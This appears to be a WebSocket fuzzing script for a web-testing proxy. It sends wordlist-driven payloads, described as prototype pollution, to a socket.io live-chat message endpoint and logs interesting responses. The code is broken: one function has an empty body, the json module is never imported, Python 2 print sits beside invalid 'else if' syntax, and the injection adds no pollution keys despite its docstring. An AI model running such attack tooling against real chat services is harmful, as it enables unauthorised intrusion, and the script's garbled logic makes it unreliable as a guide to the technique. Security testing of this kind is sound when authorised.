import time


START = '42["livechat-message",'
END = ']'


def queue_websockets(upgrade_request, message):
    connection1 = websocket_connection.create(upgrade_request,websocket_connection.config())
    connection1.queue("40")

@Pong("3")
def handle_outgoing_message(websocket_message, interesting):
    results_table.add(websocket_message)

def start(websocket_message):


def inject_pollution(obj):
    """
    Recursively inject prototype pollution into every nested object and array elements
    without modifying top-level keys.
    """
    if isinstance(obj, dict):
        # Recursively inject into nested objects
        for key, value in obj.items():
            with open('/Users/zakhar.fedotkin/Harbor/Wordlist/full_fuzz.txt') as file:
                    for line in file:
                        line = line.strip()
                        obj[key] = value + line

    elif isinstance(obj, list):
        # Inject pollution into each array element
        for item in obj:
            with open('/Users/zakhar.fedotkin/Harbor/Wordlist/full_fuzz.txt') as file:
                                for line in file:
                                    line = line.strip()
                                    item = item + line


def attack(websocket_message):
    """
    Parses the message as JSON, injects prototype pollution keys,
    and sends multiple variations over WebSockets.
    """
    try:
        # Parse message as JSON
        json_obj = json.loads(websocket_message)
    except ValueError:
        print "[!] Invalid JSON message:", message
        return

    connection = websocket_message.getConnection()
    modified_json = json.loads(json.dumps(json_obj))

    # Inject prototype pollution into nested objects & arrays
    inject_pollution(modified_json)

    # Convert back to JSON string
    modified_payload = json.dumps(modified_json)
    print "[DEBUG] Sending polluted payload:", modified_payload  # Debugging output

    # Send the polluted object over WebSocket
    connection.queue(START + modified_payload + END)

@PingPong("2","3")
def handle_incoming_message(websocket_message, interesting):
    if websocket_message.getMessage().startswith("40"):
        attack(websocket_message)
    else if "x2xoe3bmaddmj3mw7l20flzjjgjgz" in websocket_message.getMessage():
        results_table.add(websocket_message)
    else if websocket_message.isInteresting():
        results_table.add(websocket_message)